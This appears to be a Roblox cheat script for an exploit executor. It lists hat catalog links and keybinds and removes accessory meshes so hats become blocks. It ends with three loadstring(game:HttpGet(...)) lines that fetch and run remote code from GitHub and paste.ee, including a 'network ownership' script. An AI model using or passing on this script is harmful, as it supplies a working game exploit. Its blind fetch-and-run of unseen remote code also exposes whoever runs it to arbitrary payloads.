--Bradster#6618
 
-- https://www.roblox.com/catalog/1103003368/Orange-Beanie-with-Black-Hair
-- https://www.roblox.com/catalog/376527500/Orange-Shades
-- https://www.roblox.com/catalog/4246228452/International-Fedora-Spain
-- https://www.roblox.com/catalog/3992084515/International-Fedora-Vietnam
-- https://www.roblox.com/catalog/48474294/ROBLOX-Girl-Hair
-- https://www.roblox.com/catalog/451220849/Lavender-Updo
-- https://www.roblox.com/catalog/376526888/Straight-Blonde-Hair
-- https://www.roblox.com/catalog/62234425/Brown-Hair
-- https://www.roblox.com/catalog/63690008/Pal-Hair
 
-- key
-- G -> try itself
-- H -> try itself
-- J -> try itself
 
 
 
 
--this script to make your hats turn into blocks
local hairAccessoriesWithoutHairInName = {
['RedBeanieWithHair'] = true;
['VarietyShades10'] = true;
}
 
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Accessory","LongStraightHair") and not hairAccessoriesWithoutHairInName[v.Name] and v.Handle:FindFirstChild("Mesh") then
    ag = v.Handle:FindFirstChild("Mesh")
    ag:Destroy()
    end
    end
 
     for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Accessory","LongStraightHair") and not hairAccessoriesWithoutHairInName[v.Name] and v.Handle:FindFirstChild("SpecialMesh") then
    ag = v.Handle:FindFirstChild("SpecialMesh")
    ag:Destroy()
    end
    end
 
 
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/OpenGamerTips/Roblox-Scripts/main/NetworkScripts/ownership.lua"))()
loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
wait(3)
loadstring(game:HttpGet("https://paste.ee/r/WeDdw", true))()